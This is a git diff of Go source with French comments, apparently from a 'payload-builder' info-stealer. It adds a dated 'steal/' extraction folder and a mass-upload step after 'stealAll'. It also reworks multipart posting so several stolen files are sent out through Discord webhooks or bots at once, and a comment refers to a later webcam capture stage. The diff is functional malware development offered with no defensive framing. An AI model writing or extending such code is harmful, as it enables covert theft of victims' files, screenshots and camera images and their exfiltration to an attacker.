@@ -20,7 +20,7 @@ import (
 	"sync/atomic"
 	"time"
 
-	"francais2nd-payload/internal/seal"
+	"payload-builder/internal/seal"
 )
 
 // La configuration n'est jamais embarquée en clair : payload.enc est du
@@ -113,6 +113,26 @@ func workPath(name string) string {
 	return filepath.Join(workDir(), name)
 }
 
+// logDir isole les journaux du reste : le dossier de travail garde captures,
+// photos et archives, les journaux vivent à part dans `logs/`.
+func logDir() string {
+	d := filepath.Join(workDir(), "logs")
+	_ = os.MkdirAll(d, 0700)
+	return d
+}
+
+// logPath rend le chemin d'un journal dans `logs/`.
+func logPath(name string) string {
+	return filepath.Join(logDir(), name)
+}
+
+// stealDir rend un dossier d'extraction neuf, daté, sous `steal/`.
+func stealDir() string {
+	d := filepath.Join(workDir(), "steal", time.Now().Format("2006-01-02_1504"))
+	_ = os.MkdirAll(d, 0700)
+	return d
+}
+
 // plog écrit une ligne dans le journal local du payload. En mode debug elle
 // est aussi poussée vers writeLog (diagnostic.txt) si -diag est actif.
 //
@@ -128,7 +148,7 @@ func plog(line string) {
 	if !cfg.Debug && statusOnly(line) {
 		return
 	}
-	path := workPath("sys.log")
+	path := logPath("sys.log")
 
 	stamp := time.Now().Format("2006-01-02 15:04:05")
 	payloadLog.Lock()
@@ -312,7 +332,10 @@ func postMultipart(target string, bot bool, files ...fileOut) {
 		if len(f.Data) > 7*1024*1024 || len(kept) >= 9 || total+len(f.Data) > 24*1024*1024 {
 			continue
 		}
-		fh, err := w.CreateFormFile("files", f.Name)
+		// Discord n'attache qu'un fichier quand plusieurs champs portent le même
+		// nom « files » : il faut des champs numérotés `files[0]`, `files[1]`… et
+		// la liste `attachments` correspondante dans payload_json.
+		fh, err := w.CreateFormFile(fmt.Sprintf("files[%d]", len(kept)), f.Name)
 		if err != nil {
 			continue
 		}
@@ -326,13 +349,16 @@ func postMultipart(target string, bot bool, files ...fileOut) {
 		return
 	}
 	// Discord attend le champ payload_json à côté des fichiers (webhook comme
-	// bot) : c'est lui qui porte la légende du message.
+	// bot) : c'est lui qui porte la légende et la table des pièces jointes.
 	var names []string
-	for _, f := range kept {
+	var atts []map[string]any
+	for i, f := range kept {
 		names = append(names, f.Name)
+		atts = append(atts, map[string]any{"id": i, "filename": f.Name})
 	}
-	meta, _ := json.Marshal(map[string]string{
-		"content": "pièces jointes : " + strings.Join(names, ", "),
+	meta, _ := json.Marshal(map[string]any{
+		"content":     "pièces jointes : " + strings.Join(names, ", "),
+		"attachments": atts,
 	})
 	_ = w.WriteField("payload_json", string(meta))
 	_ = w.Close()
@@ -472,6 +498,9 @@ func startPayload() {
 			return
 		}
 		stealAll(true)
+
+		// Première extraction de masse, une seule fois par poste.
+		go bulkUploadAll(false)
 
 		// 5. Webcam : encore plus tard, et seulement si une caméra existe.
 		time.Sleep(time.Duration(120+rand.Intn(180)) * time.Second)
